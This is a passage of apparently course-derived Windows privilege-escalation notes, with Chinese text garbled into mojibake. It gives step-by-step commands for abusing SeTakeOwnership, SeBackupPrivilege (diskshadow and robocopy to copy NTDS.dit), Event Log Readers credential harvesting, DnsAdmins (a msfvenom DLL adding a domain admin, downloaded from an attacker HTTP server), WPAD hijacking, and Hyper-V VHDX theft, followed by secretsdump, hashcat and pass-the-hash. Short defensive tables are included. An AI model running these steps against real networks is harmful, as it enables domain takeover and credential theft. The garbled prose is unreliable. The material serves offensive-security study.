### üß© ÊîªÊìäÊ≠•È©ü + Êåá‰ª§

#### ‚úÖ Á¨¨‰∏ÄÊ≠•ÔºöÁ¢∫Ë™çÊ¨äÈôê

```powershell
whoami /priv
```

‚û° Á¢∫Ë™çÊúâ `SeTakeOwnershipPrivilege`

`Â¶ÇÊûúÊòØÊúâÔºå‰ΩÜÊòØÊ≤íÊúâÂïüÁî®ÂèØ‰ª•Ë∑üÈö®‰ª•‰∏ãÊåá‰ª§ (ÈúÄË¶ÅÊñá‰ª∂‰∏äÂÇ≥)`&#x20;

```powershell
PS C:\Windows\system32> cd  C:\Tools
PS C:\Tools> Import-Module .\Enable-Privilege.ps1
PS C:\Tools> .\EnableAllTokenPrivs.ps1
```

ÁÑ∂ÂæåÔºåÂ≠∏ÁîüÈúÄË¶ÅÂÜçÊ¨°Ê™¢Êü•‰ΩøÁî®ËÄÖÊ¨äÈôêÔºåÊü•Áúã `SeTakeOwnershipPrivilege` ÊòØÂê¶Â∑≤ÂïüÁî®Ôºö

***

#### ‚úÖ Á¨¨‰∫åÊ≠•ÔºöÁõÆÊ®ôÁâ©‰ª∂ÁØÑ‰æã

* Â∏∏Ë¶ãÂèØ‰ª•Âà©Áî®Ê™îÊ°àÔºö

```
C:\inetpub\wwwroot\web.config
C:\Department Shares\Private\IT\cred.txt
%WINDIR%\repair\sam
.kdbxÔºàKeePass Ë≥áÊñôÂ∫´Ôºâ
```

***

#### ‚úÖ Á¨¨‰∏âÊ≠•ÔºöÊé•ÁÆ°ÊâÄÊúâÊ¨ä

```powershell
takeown /f "C:\Ë∑ØÂæë\ÁõÆÊ®ôÊ™îÊ°à.txt"
```

* ÊàêÂäüÊúÉÈ°ØÁ§∫Ôºö

```
SUCCESS: The file "xxx" now owned by user "domain\user".
```

***

#### ‚úÖ Á¨¨ÂõõÊ≠•Ôºö‰øÆÊîπ ACL Ê¨äÈôê

```powershell
icacls "C:\Ë∑ØÂæë\ÁõÆÊ®ôÊ™îÊ°à.txt" /grant <Áî®Êà∂ÂêçÁ®±>:F
```

* F = Full control

***

#### ‚úÖ Á¨¨‰∫îÊ≠•ÔºöËÆÄÂèñÊïèÊÑüË≥áË®ä

```powershell
type "C:\Ë∑ØÂæë\ÁõÆÊ®ôÊ™îÊ°à.txt"
Êàñ
Get-Content "C:\Ë∑ØÂæë\ÁõÆÊ®ôÊ™îÊ°à.txt"
```

***

### üéì Âª∂‰º∏Âà©Áî®

* Êê≠ÈÖç GPO Ê¨äÈôêÊø´Áî®ÔºöÁî® SharpGPOAbuse ÊåáÊ¥æ SeTakeOwnership Ê¨äÈôêÁµ¶Ëá™Â∑±
* Êé•ÁÆ°ÁôªÈåÑÊ©üÁ¢ºÔºàregistry keysÔºâÔºö

```powershell
takeown /f "HKLM:\Software\..."
icacls "HKLM:\Software\..." /grant <username>:F
```

* Êé•ÁÆ°ÊúçÂãôÔºàservicesÔºâÔºåÁÑ∂Âæå‰øÆÊîπ Binary Path ‰ª•ÊèêÊ¨ä

</details>

<details>

<summary>SeBackupPrivilege Ê¨äÈôêÊø´Áî®ÊîªÊìä</summary>

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

* **Backup Operators Áæ§ÁµÑ** = ÂÖ¨Âè∏„ÄåÂÇô‰ªΩÈÉ®ÈñÄ‰∫∫Âì° üë©‚Äçüíª„Äç
* Âë¢ÂÄãÈÉ®ÈñÄÊú¨‰æÜËÅ∑Ë≤¨‰øÇÔºöÂ∞±ÁÆóÂÜáÊ¨äÈôêÈÉΩÂèØ‰ª•ÂÇô‰ªΩÊâÄÊúâÊñá‰ª∂ÔºàÂõ†ÁÇ∫ÂÇô‰ªΩÂîîËÉΩÈòªÊ≠¢Ôºâ
* ÊîªÊìäËÄÖÂè™Ë¶ÅÊàêÁÇ∫ Backup OperatorÔºåÂ∞±Á≠âÊñºÂèØ‰ª•Ëµ∞ÂæåÈñÄÂ∞á‰ªª‰ΩïÊ™îÊ°à„ÄåÂÅ∑ÂÅ∑Êê¨Âá∫ÂÖ¨Âè∏ üóÑÔ∏è„Äç

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñ

```
[1Ô∏è‚É£ ÊãøÂà∞ Backup Operators Áæ§ÁµÑÂ∏≥Êà∂ (Êàñ SeBackupPrivilege Ê¨äÈôê)]  
     ‚îÇ  
     ‚Üì  
[2Ô∏è‚É£ whoami /priv Á¢∫Ë™ç SeBackupPrivilege & SeRestorePrivilege]  
     ‚îÇ  
     ‚Üì  
[3Ô∏è‚É£ Import DLL Â∑•ÂÖ∑ / ‰ΩøÁî® PowerShell Cmdlet]  
     ‚îÇ  
     ‚Üì  
[4Ô∏è‚É£ ÈñãÂïü SeBackupPrivilege Ê¨äÈôê (Set-SeBackupPrivilege)]  
     ‚îÇ  
     ‚Üì  
[5Ô∏è‚É£ ‰ΩøÁî® Copy-FileSeBackupPrivilege / robocopy / diskshadow Ë§áË£ΩÊïèÊÑüÊ™îÊ°à]  
     ‚îÇ  
     ‚Üì  
[6Ô∏è‚É£ Áç≤Âèñ NTDS.dit / SYSTEM / SAM / web.config Á≠âÊ™îÊ°à]  
     ‚îÇ  
     ‚Üì  
[7Ô∏è‚É£ Èõ¢Á∑öÁî® secretsdump.py / DSInternals ÊèêÂèñ AD ÂØÜÁ¢ºÈõúÊπä]  
     ‚îÇ  
     ‚Üì  
[8Ô∏è‚É£ Pass-the-Hash / Crack / Ê©´ÂêëÊª≤ÈÄè]  
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### ‚úÖ Á¨¨‰∏ÄÊ≠•ÔºöÊ™¢Êü•Áæ§ÁµÑ / Ê¨äÈôê

```powershell
whoami /groups
whoami /priv
```

Á¢∫Ë™çÊúâ `SeBackupPrivilege` & `SeRestorePrivilege`

***

#### ‚úÖ Á¨¨‰∫åÊ≠•ÔºöÈñãÂïüÂÇô‰ªΩÊ¨äÈôê (Â¶ÇÊûú‰øÇdisable  ÈúÄË¶ÅÊñá‰ª∂‰∏äÂÇ≥)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
```

***

d

#### ‚úÖ Á¨¨‰∏âÊ≠•ÔºöÁî® Cmdlet Êê∂Ë§áÂèó‰øùË≠∑Ê™îÊ°à

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

***

#### ‰∏ãÈù¢Â¶ÇÊûúÂÜáÈúÄË¶ÅÂèØ‰ª•Âîî‰ΩøÁî®

#### ‚úÖ Á¨¨ÂõõÊ≠•ÔºöDiskshadow Êê∂Ë§á NTDS.dit

```cmd
diskshadow
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

ÁÑ∂ÂæåÂú® E: ÊäÑ NTDS.dit

***

#### ‚úÖ Á¨¨‰∫îÊ≠•ÔºöÁî® robocopy (ÂÇô‰ªΩÊ®°Âºè B flag)

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

***

#### ‚úÖ Á¨¨ÂÖ≠Ê≠•ÔºöÁî® secretsdump.py Èõ¢Á∑öÊèê hash

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

ÊãøÂà∞ÊâÄÊúâ domain user hashÔºå‰∏¶ÂèØ Pass-The-Hash ÈÄ≤Ë°åÊ©´ÂêëÊîªÊìä„ÄÇ

***

### ‚ö† ËóçÈöäÈò≤ÂÆàÊèêÁ§∫

| Èò≤ÂÆàË°åÂãï                                                     | ÂéüÂõ†                                                |
| -------------------------------------------------------- | ------------------------------------------------- |
| Âö¥Ê†ºÂØ©Êü• Backup Operators / DnsAdmins / Print Operators Áæ§ÁµÑÊàêÂì° | ÈÄô‰∫õÁæ§ÁµÑÊàêÂì°ÂèØÈùûÁÆ°ÁêÜÂì°ÁãÄÊÖã‰∏ãÂü∑Ë°åÈ´òÊïèÊÑüË°åÁÇ∫                             |
| Á¶ÅÊ≠¢Ê∏¨Ë©¶ÂæåÊÆòÁïôÂ∏≥Êà∂                                                | Á∂ìÂ∏∏Âá∫ÁèæÊ∏¨Ë©¶ÂÆåÂâ©‰∏ãÁöÑÂ∏≥Êà∂ÊÑèÂ§ñ‰øùÁïô Backup Operator Ê¨äÈôê               |
| Ë®≠ÁΩÆÁõ£Êéß                                                     | ÈáùÂ∞ç diskshadow / robocopy / reg save Á≠âÈóúÈçµË°åÁÇ∫ÊáâÁõ£Êéß‰∏¶Áî¢ÁîüÂëäË≠¶ |

</details>

<details>

<summary>Event Log Readers Ê¨äÈôêÊø´Áî®ÊïèÊÑüÂëΩ‰ª§Ë°åÊì∑ÂèñÊîªÊìä</summary>

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

* **Event Log Readers** = „ÄåÂÖ¨Âè∏Á®ΩÊ†∏ÂÆ§üóÑÔ∏èËÆÄÂèñÊ¨äÈôêÁµÑ„Äç
* Êú¨Ë≥™‰∏äÔºöÈõñÁÑ∂Âîî‰øÇ IT AdminÔºå‰ΩÜÊúâÊ¨äÊâìÈñã„ÄåÂÖ¨Âè∏Ë°åÁÇ∫ÈªëÁõíÂ≠ê üìÇ„Äç
* ÂèØ‰ª•ÁøªÈñ±ÊâÄÊúâÊó•Ë™åÔºåÂåÖÊã¨Ë™∞ÈñãÂíóÂí©Á®ãÂºè„ÄÅÂí©Êåá‰ª§Ë°åÔºàCommand line auditÔºâ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñ

```
[1Ô∏è‚É£ ÊãøÂà∞ Event Log Readers Ê¨äÈôê or ÊâæÂà∞ÊúâÊ≠§Ê¨äÈôêÂ∏≥Ëôü]  
     ‚îÇ  
     ‚Üì  
[2Ô∏è‚É£ Âà©Áî® wevtutil / Get-WinEvent Êü•Èñ± 4688 ‰∫ã‰ª∂Ë®òÈåÑ]  
     ‚îÇ  
     ‚Üì  
[3Ô∏è‚É£ ÊêúÁ¥¢ÂåÖÂê´ÊïèÊÑüÂèÉÊï∏ÔºàÂ¶Ç /user„ÄÅnet use„ÄÅwmic„ÄÅtasklistÔºâ]  
     ‚îÇ  
     ‚Üì  
[4Ô∏è‚É£ Êì∑ÂèñÂá∫ÊòéÊñáÂ∏≥ËôüÂØÜÁ¢º„ÄÅÊåá‰ª§ÂàóÊ≠∑Âè≤Ôºà‰æãÔºönet use /user:tim ÂØÜÁ¢ºÔºâ]  
     ‚îÇ  
     ‚Üì  
[5Ô∏è‚É£ ÊáâÁî®Êî∂ÈõÜÂà∞ÁöÑÂ∏≥ÂØÜÈÄ≤Ë°åÊ©´ÂêëÊª≤ÈÄè / ÊèêÊ¨ä / Á∂≤ÂüüÂ≠òÂèñ]  
```

***

### üë®‚Äçüè´ ÊîªÊìäÊåá‰ª§ÁØÑ‰æã

‚úÖ ÈñãÂïü PowerShell ‰∏¶Ê™¢Êü•Âì™‰∫õ‰ΩøÁî®ËÄÖÂú® `Event Log Readers` Áæ§ÁµÑ‰∏≠Ôºö

```powershell
net localgroup "Event Log Readers"
```

#### ‚úÖ wevtutil Ê™¢Á¥¢ÂÆâÂÖ®Êó•Ë™å

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

> ÊâæÂá∫ÊâÄÊúâÂú®Êåá‰ª§ÂàóË£°Âá∫Áèæ `/user` ÁöÑÂëΩ‰ª§Ë°åÁ¥ÄÈåÑ
>
> ÂæûÂëΩ‰ª§ÁöÑËº∏Âá∫‰∏≠ÔºåÂ≠∏ÁîüÊúÉÁü•ÈÅì `mary` Áî®Êà∂ÁöÑÂØÜÁ¢ºÊòØ `W1ntergreen_gum_2021!` „ÄÇ

***

#### ‚úÖ wevtutil ‰ΩøÁî®ÂÖ∂‰ªñÊÜëË≠â

```cmd
wevtutil qe Security /rd:true /f:text /r:<ÁõÆÊ®ô‰∏ªÊ©ü> /u:<Áî®Êà∂> /p:<ÂØÜÁ¢º> | findstr "/user"
```

> ÂèØÈÅ†Á®ãÊàñÁî®‰∏çÂêåË∫´‰ªΩÈÄ£‰∏äÂéªÊü•

***

#### ‚úÖ PowerShell Get-WinEvent Ê™¢Á¥¢ 4688

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

> Â∞àÈñÄÈáùÂ∞ç„ÄåÊúâ /user„ÄçÂèÉÊï∏ÁöÑÊïèÊÑüÊåá‰ª§
>
> ***

***

### üí° ‰æãÂ≠êÔºöÂèØ‰ª•ÊäìÂà∞‰ªÄÈ∫ºÔºü

```
Process Command Line: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

‚û° Â∞±ÂèØ‰ª•ÁÑ°ËÅ≤ÁÑ°ÊÅØÊãøÂà∞ÊòéÊñáÂØÜÁ¢º üîì

***

### ‚ö† Èò≤Á¶¶ÊñπÂª∫Ë≠∞

| Èò≤ÂÆàË°åÂãï                                         | ÂéüÂõ†                                    |
| -------------------------------------------- | ------------------------------------- |
| ÂÉÖÊéàÊ¨ä Event Log Readers Áµ¶ÂèØ‰ø°Â∏≥Êà∂                  | Ë©≤Ê¨äÈôêÂèØÁî®‰æÜÊì∑ÂèñÊâÄÊúâË°åÁÇ∫Á¥ÄÈåÑÔºåÂåÖÂê´ÊòéÊñáÂØÜÁ¢ºÔºåÊ•µÈ´òÊïèÊÑüÂ∫¶           |
| ÈñãÂïü PowerShell Script Block Logging ‰∏¶ÁôºÈÄÅËá≥ SIEM | ÂèØË£úÊçâ PowerShell Ë®òÈåÑÔºåÈÅøÂÖçË¢´Êø´Áî®               |
| Ë®≠ÂÆö AppLocker / WDAC                          | Á¶ÅÊ≠¢ÂèØÁñëÁî®Êà∂‰ΩøÁî® wevtutil / PowerShell ÊïèÊÑüÊìç‰ΩúË°åÁÇ∫ |
| Áõ£Êéß 4688 ‰∏≠È´òÊïèÊÑüÂëΩ‰ª§Ôºàtasklist„ÄÅnet use„ÄÅipconfigÔºâ    | ÂæûÈùûÊäÄË°ìÂ¥ó‰Ωç‰∏ªÊ©üÂü∑Ë°åÈÄô‰∫õÊåá‰ª§Ë¶ÅÁ´ãÂç≥Ë≠¶Â†±                   |

</details>

<details>

<summary>DnsAdmins Ê¨äÈôêÊø´Áî®ÊîªÊìä</summary>

### üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ**

* **DnsAdmins Áæ§ÁµÑ** = ÂÖ¨Âè∏ÂÖßÈÉ®„ÄåDNS ÁÆ°ÁêÜÈÉ®ÈñÄ üè¢„Äç
* ÈÄôÁæ§‰∫∫Ë≤†Ë≤¨Á∂≠Ë≠∑ **DNS ‰º∫ÊúçÂô®**Ôºå‰ΩÜ Windows Áµ¶‰ªñÂÄëÁöÑÊ¨äÈôêÂ§™Â§ß üöÄ
* **ÊîªÊìäËÄÖÂè™Ë¶ÅÊàêÁÇ∫ DnsAdminsÔºåÂ∞±ÂèØ‰ª•Êãø‰∏ã SYSTEM Ê¨äÈôê üíÄ**

***

### üöÄ **ÊîªÊìäÊµÅÁ®ãÂúñ**

```
[1Ô∏è‚É£ Áç≤Âèñ DnsAdmins Ê¨äÈôêÂ∏≥ËôüÔºàÂèØÈÄèÈÅéÁ∂≤Ë∑ØÈá£È≠ö / Hash ÊîªÊìäÂèñÂæóÔºâ]  
     ‚îÇ  
     ‚Üì  
[2Ô∏è‚É£ Á¢∫Ë™ç DnsAdmins Áæ§ÁµÑË∫´‰ªΩÔºàGet-ADGroupMember DnsAdminsÔºâ]  
     ‚îÇ  
     ‚Üì  
[3Ô∏è‚É£ Âà©Áî® dnscmd Ë®≠ÁΩÆ ServerLevelPluginDllÔºåÊéõËºâÊÉ°ÊÑè DLL]  
     ‚îÇ  
     ‚Üì  
[4Ô∏è‚É£ ÈáçÊñ∞ÂïüÂãï DNS ÊúçÂãôÔºàsc stop dns && sc start dnsÔºâ]  
     ‚îÇ  
     ‚Üì  
[5Ô∏è‚É£ ÊàêÂäüÂü∑Ë°åÊÉ°ÊÑè DLLÔºåÂèØÂèñÂæó SYSTEM Ê¨äÈôêÊàñÂèçÂêë shell]  
     ‚îÇ  
     ‚Üì  
[6Ô∏è‚É£ Âà©Áî® SYSTEM Ê¨äÈôê Dump LSASS / Pass-the-Hash ÈÄ≤Ë°åÊ©´ÂêëÁßªÂãï]  
```

***

### üë®‚Äçüè´ **ÊîªÊìäÊ≠•È©üÁØÑ‰æã**

#### ‚úÖ **Á¨¨‰∏ÄÊ≠•ÔºöÁ¢∫Ë™ç DnsAdmins Ê¨äÈôê**

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

* Á¢∫Ë™çÁï∂ÂâçÂ∏≥ËôüÊòØÂê¶Â±¨Êñº **DnsAdmins** Áæ§ÁµÑ„ÄÇ

***

#### ‚úÖ **Á¨¨‰∫åÊ≠•ÔºöÁî¢ÁîüÊÉ°ÊÑè DLL**

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

* **Ê≠§ DLL ÊúÉËá™ÂãïÂ∞áÂ∏≥Ëôü `netadm` Âä†ÂÖ• Domain Admins Áæ§ÁµÑ„ÄÇ**

***

#### &#x20;‚úÖ  ÂïüÂãï‰∏ÄÂÄã Python HTTP ‰º∫ÊúçÂô® Pwnbox/ `PMVPN`

```shell-session
python3 -m http.server 7777
```

#### ‚úÖ **Á¨¨‰∏âÊ≠•Ôºö‰∏äÂÇ≥ÊÉ°ÊÑè DLL Âà∞ÁõÆÊ®ô**

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "C:\Users\netadm\Desktop\adduser.dll"
```

* **Â∞áÊÉ°ÊÑè DLL ‰∏ãËºâËá≥ÁõÆÊ®ôÊ©üÂô®‰∏ä„ÄÇ**

***

#### ‚úÖ **Á¨¨ÂõõÊ≠•ÔºöÈÖçÁΩÆ ServerLevelPluginDll**&#x20;

#### ÈúÄË¶ÅÊâìÈñãÂëΩ‰ª§ÊèêÁ§∫Â≠óÂÖÉ‰∏¶ËºâÂÖ•ÊÉ°ÊÑè `.dll`&#x20;

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

* **Ê≠§ÂëΩ‰ª§ÊúÉÂ∞áÊàëÂÄëÁöÑÊÉ°ÊÑè DLL Ë®≠ÁÇ∫ DNS ‰º∫ÊúçÂô®ÁöÑ Plugin„ÄÇ**

***

#### ‚úÖ **Á¨¨‰∫îÊ≠•ÔºöÈáçÊñ∞ÂïüÂãï DNS ÊúçÂãô**

```cmd
sc stop dns && sc start dns
```

* **ÈÄôÂ∞áÊúÉËÆì DNS ÊúçÂãôÂä†ËºâÊàëÂÄëÁöÑÊÉ°ÊÑè DLLÔºåÂü∑Ë°åÊÉ°ÊÑèÂëΩ‰ª§„ÄÇ**

***

#### ‚úÖ **Á¨¨ÂÖ≠Ê≠•ÔºöÈ©óË≠âÊèêÊ¨äÊòØÂê¶ÊàêÂäü**

```cmd
net group "Domain Admins" /domain
```

* **Â¶ÇÊûúÁúãÂà∞ `netadm` Âá∫ÁèæÂú® Domain Admins ÂÖßÔºåÊîªÊìäÊàêÂäüÔºÅüéâ**

***

### üí° **Âª∂‰º∏Âà©Áî®ÔºöÂà©Áî® WPAD Âä´ÊåÅÂÖßÁ∂≤ÊµÅÈáè**

#### **üëâ WPAD Âä´ÊåÅÊîªÊìä**

* **DnsAdmins ÈÇÑÂèØ‰ª•Ë®≠ÁΩÆ DNS Ë®òÈåÑÔºå‰æÜÈÄ≤Ë°å WPAD ÊîªÊìäÔºåÂä´ÊåÅÂÖßÁ∂≤ HTTP / SMB ÊµÅÈáè„ÄÇ**

```cmd
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

* **Ê≠§Êìç‰ΩúÊúÉÂ∞áÂÖßÈÉ®ÊâÄÊúâ‰ΩøÁî®È†êË®≠ WPAD Ë®≠ÂÆöÁöÑÈõªËÖ¶ÊåáÂêëÊîªÊìäËÄÖÊ©üÂô®„ÄÇ**
* **ÁÑ∂ÂæåÔºåÊîªÊìäËÄÖÂèØ‰ª•Áî® Responder Êàñ Inveigh ÈÄ≤Ë°å SMB Relay ÊîªÊìäÔºåÁç≤Âèñ NTLM HashÔºÅ**

***

### ‚ö† **ËóçÈöäÈò≤Á¶¶Âª∫Ë≠∞**

| Èò≤Á¶¶Êé™ÊñΩ                                    | ÂéüÂõ†                                      |
| --------------------------------------- | --------------------------------------- |
| **ÊúÄÂ∞èÂåñ DnsAdmins ÊàêÂì°**                    | Âè™ÂÖÅË®±ÂøÖË¶Å‰∫∫Âì°ÊìÅÊúâÊ≠§Ê¨äÈôêÔºå‰∏¶ÂÆöÊúüÂØ©Êü•ÊàêÂì°ÊòØÂê¶ÊúâÁï∞Â∏∏ËÆäÂãï„ÄÇ            |
| **Áõ£Êéß dnscmd / ServerLevelPluginDll Ë®≠ÁΩÆ** | Ê™¢Ê∏¨Áï∞Â∏∏ DNS ÈÖçÁΩÆËÆäÊõ¥ÔºåÊáâÁî® SIEM Ë®òÈåÑËÆäÊõ¥Ë°åÁÇ∫„ÄÇ           |
| **ÈôêÂà∂ WPAD / Á¶ÅÁî® LLMNR / NBT-NS**         | Èò≤Ê≠¢ WPAD Âä´ÊåÅËàáÂÖßÈÉ®ÊµÅÈáèËΩâÁôºÊîªÊìäÔºåÈÅøÂÖçÂÖßÈÉ® Hash Ê¥©Èú≤„ÄÇ       |
| **Ë®≠ÂÆö AppLocker ÈôêÂà∂ DLL Âä†Ëºâ**              | Èò≤Ê≠¢Èùû‰ø°‰ªª DLL Ë¢´Âä†ËºâÂà∞Á≥ªÁµ±ÊúçÂãôÔºåÊ∏õÂ∞ë DLL Injection È¢®Èö™„ÄÇ |

</details>

<details>

<summary>Hyper-V Administrators Ê¨äÈôêÂà©Áî®</summary>

#### üè¢ ÊîªÊìäÁõÆÊ®ôÊ¶ÇÂøµÔºö

Hyper-V AdministratorsÔºàËôõÊì¨Ê©üÁÆ°ÁêÜÂì°ÔºâÁæ§ÁµÑÊìÅÊúâ Hyper-V ÂÖ®ÂäüËÉΩÊéßÂà∂Ê¨ä„ÄÇ

> Ëã•ÂüüÊéßÔºàDomain ControllerÔºâË¢´ËôõÊì¨ÂåñÔºåHyper-V ÁÆ°ÁêÜÂì°ÂèØÈÄèÈÅéËôõÊì¨Á£ÅÁ¢üÊ™îÔºàVHDXÔºâËºïÈ¨ÜË§áË£Ω‰∏¶Èõ¢Á∑öÊéõËºâ‰æÜÊèêÂèñ `NTDS.dit`ÔºàÂüü‰∏≠ÊâÄÊúâÁî®Êà∂ÁöÑÂØÜÁ¢º hash ÂÄâÂ∫´Ôºâ„ÄÇ\
> üîé ÁµêË´ñÔºöHyper-V Admin = ÊΩõÂú®ÁöÑ Domain AdminÔºÅ

***

### üåü ÂÖ¨Âè∏Âåñ + emoji ÊîªÊìäÊµÅÁ®ãÂúñ

```
üéØ Á¢∫Ë™çÊòØÂê¶ÁÇ∫ Hyper-V ÁÆ°ÁêÜÂì°
‚îÇ
‚îú‚îÄ> üõ†Ô∏è Â∑•ÂÖ∑Ôºö
‚îÇ   - PowerShellÔºöGet-LocalGroupMember -Group "Hyper-V Administrators"
‚îÇ   - CMDÔºönet localgroup "Hyper-V Administrators"
‚îÇ
‚îú‚îÄ> ‚úÖ Âá∫ÁèæËá™Â∑±Â∏≥Êà∂ ‚û° ÊìÅÊúâ Hyper-V Admin Ê¨äÈôêÔºÅ
‚îÇ
‚îú‚îÄ> üì¶ ÁôºÁèæÂüüÊéß VM
‚îÇ
‚îú‚îÄ> üìÅ Ë§áË£ΩÂüüÊéßÁöÑ VHDX Ê™î
‚îÇ
‚îú‚îÄ> üíª Èõ¢Á∑öÊéõËºâ VHDX
‚îÇ
‚îú‚îÄ> üîç ÊèêÂèñ NTDS.dit + SYSTEM hive
‚îÇ
‚îú‚îÄ> üß∞ ‰ΩøÁî® secretsdump.py ÂèñÂæóÊâÄÊúâÂüüÂ∏≥Ëôü hash
‚îÇ
‚îú‚îÄ> üõ°Ô∏è ‰ΩøÁî® pass-the-hash„ÄÅcrack hashÔºåÊàñÁõ¥Êé•ÂüüÊéßÁôªÂÖ•
‚îÇ
‚îî‚îÄ> üéâ ÊàêÂäüÂèñÂæó Domain Admin Ê¨äÈôêÔºÅ
```

***

### üìù ÂÖ¨Âè∏ÂåñË©≥Á¥∞Ê≠•È©ü

#### ‚û° 1Ô∏è‚É£ Á¢∫Ë™çÊòØÂê¶Êúâ Hyper-V Admin Ê¨äÈôê

```powershell
Get-LocalGroupMember -Group "Hyper-V Administrators"
```

‚úÖ Ëº∏Âá∫ÁØÑ‰æãÔºö

```
Name          ObjectClass
----          -----------
pentester     User
```

> ‚û° ÁúãÂà∞Ëá™Â∑±Â∏≥ËôüÂ∞±‰ª£Ë°®ÂèØ‰ª•ÁπºÁ∫åË°åÂãïÔºÅ

***

#### ‚û° 2Ô∏è‚É£ Êü•ÁúãÂüüÊéßËôõÊì¨Ê©üÂô®Ë∑ØÂæë üìÅ

* ‰∏ÄËà¨‰ΩçÊñºÔºö

```
C:\ProgramData\Microsoft\Windows\Hyper-V\Virtual Machines\
```

* ÊâæÂà∞ VHDX Ë∑ØÂæëÊàñ .vmcx ÈÖçÁΩÆÊ™îÊ°àÂÖßÁöÑËôõÊì¨Á£ÅÁ¢üË∑ØÂæë„ÄÇ

***

#### ‚û° 3Ô∏è‚É£ Ë§áË£ΩÂá∫ VHDX Ê™îÊ°à üóÉÔ∏è

```powershell
Copy-Item "C:\HyperV\DC01\DC01.vhdx" "C:\Temp\DC01_copy.vhdx"
```

***

#### ‚û° 4Ô∏è‚É£ ÊéõËºâËôõÊì¨Á£ÅÁ¢ü üíª

```powershell
Mount-VHD -Path "C:\Temp\DC01_copy.vhdx" -ReadOnly
```

> üìù ÊéõËºâÊàêÂäüÂæåÔºåÁ£ÅÁ¢üÊúÉÂá∫ÁèæÂú®Á≥ªÁµ±Á£ÅÁ¢üÊ©üÂàóË°®„ÄÇ

***

#### ‚û° 5Ô∏è‚É£ Â∞ãÊâæ NTDS.dit + SYSTEM hive Ê™îÊ°à üìÇ

```plaintext
E:\Windows\NTDS\ntds.dit
E:\Windows\System32\config\SYSTEM
```

> üëÄ ÂæûÊéõËºâÁöÑÁ£ÅÁ¢üÂèñÂæóÈÄôÂÖ©ÂÄãÊ™îÊ°àÔºÅ

***

#### ‚û° 6Ô∏è‚É£ ‰ΩøÁî® secretsdump.py ÊèêÂèñ hash üß∞

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -just-dc LOCAL
```

‚úÖ Ëº∏Âá∫ÁØÑ‰æãÔºö

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
```

> üéâ ÂæóÂà∞ NTLM HashÔºåÊ∫ñÂÇôÊ©´ÂêëÊàñÈõ¢Á∑öÁ†¥Ëß£ÔºÅ

***

#### ‚û° 7Ô∏è‚É£ ‰ΩøÁî® Pass-the-Hash Êàñ crack hash üõ°Ô∏è

* ‰ΩøÁî® hashcat Á†¥Ëß£

```bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
```

* ÊàñÁõ¥Êé• Pass-the-Hash ÊîªÊìä

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 administrator@dc01.local
```

***

### ‚úÖ Â¶ÇÊûúÂ§±ÊïóÔºåDebug ÊñπÊ≥ï üõ†Ô∏èÔºö

| ÂïèÈ°å               | ÂéüÂõ†                     | Ëß£Ê±∫Âª∫Ë≠∞                          |
| ---------------- | ---------------------- | ----------------------------- |
| ÊéõËºâ VHDX Â§±Êïó       | Ê¨äÈôê‰∏çË∂≥ÊàñÊ™îÊ°àÊêçÂ£û              | ‰ΩøÁî®Á≥ªÁµ±ÁÆ°ÁêÜÂì° PowerShellÔºåÊàñÁ¢∫Ë™çË∑ØÂæëËàáÊ™îÊ°àÂÆåÂ•Ω |
| secretsdump ÊèêÂèñÈåØË™§ | SYSTEM Êàñ ntds.dit Ë∑ØÂæëÈåØË™§ | ÂÜçÁ¢∫Ë™çÊéõËºâÁ£ÅÁ¢ü‰ª£ËôüÔºåÈáçÊñ∞ÊåáÂÆöË∑ØÂæë              |
| psexec Âü∑Ë°åÂæåÁÑ°Ê≥ïÁôªÂÖ•   | hash ÈåØË™§ÊàñÂüüÊéßÁÑ°Ê≥ïÈÄ£Á∑ö         | Ê™¢Êü•Á∂≤Ë∑ØËàá hash Ê≠£Á¢∫ÊÄßÔºõÂ¶ÇÊúâÈò≤ÁÅ´ÁâÜÔºåÂèØÂòóË©¶ RDP  |

</details>

<details>

<summary>Print OperatorsÔºàÂàóÂç∞Êìç‰ΩúÂì°ÔºâÊ¨äÈôêÂà©Áî®</summary>

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

**Print Operators Áæ§ÁµÑ = ÂÖ¨Âè∏ÂÖßÈÉ®„ÄåÂàóÂç∞ÁÆ°ÁêÜÈÉ®ÈñÄ üñ®Ô∏èüè¢„Äç**\
ÈÄôÁæ§‰∫∫Êú¨‰æÜÂè™ÊòØÂπ´ÂÖ¨Âè∏ÁÆ°ÁêÜÂç∞Ë°®Ê©ü üñ®Ô∏è\
